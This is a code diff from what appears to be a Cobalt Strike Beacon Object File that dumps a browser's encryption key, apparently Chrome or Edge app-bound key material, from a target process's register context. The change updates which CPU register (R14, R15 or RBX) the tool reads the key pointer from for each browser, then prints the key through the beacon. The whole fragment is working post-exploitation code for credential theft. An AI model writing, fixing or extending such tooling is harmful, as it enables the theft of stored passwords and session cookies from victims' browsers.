@@ -481,26 +481,26 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "    RIP=%llx EFLAGS=%08lx\n", ctx.Rip, ctx.EFlags);
 #endif // _DEBUG
 
-        if (ctx.R14 == 0)
+        if (!edge && ctx.R15 == 0)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "R15 registry was empty\n");
+            return;
+        }
+
+        if (edge && ctx.R14 == 0)
         {
             BeaconPrintf(CALLBACK_ERROR, "R14 registry was empty\n");
             return;
         }
 
-        if (edge && ctx.Rbx == 0)
-        {
-            BeaconPrintf(CALLBACK_ERROR, "RBX registry was empty\n");
-            return;
-        }
-
         if (edge)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from RBX\n");
-            PrintKey(hProc, ctx.Rbx);
-        }
-        else {
             BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from R14\n");
             PrintKey(hProc, ctx.R14);
+        }
+        else {
+            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from R15\n");
+            PrintKey(hProc, ctx.R15);
         }
     }
 
